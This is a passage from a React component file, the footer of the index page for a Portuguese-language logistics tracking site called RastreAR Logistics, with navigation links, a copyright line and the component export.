              <a href="/privacidade" className="hover:text-zinc-900 transition-colors">Privacidade</a>
              <a href="/afiliados" className="hover:text-zinc-900 transition-colors">Afiliados</a>
              <a href="/suporte" className="hover:text-zinc-900 transition-colors">Suporte</a>
            </nav>
          </div>
          <div className="flex flex-col md:flex-row justify-between items-center gap-6 text-[10px] font-bold text-zinc-300 uppercase tracking-[0.25em]">
            <p>© 2024 RastreAR Logistics. Todos os direitos reservados.</p>
            <p className="flex items-center gap-2">Feito com <Zap size={12} className="text-orange-400 fill-orange-400" /> para uma logística inteligente.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;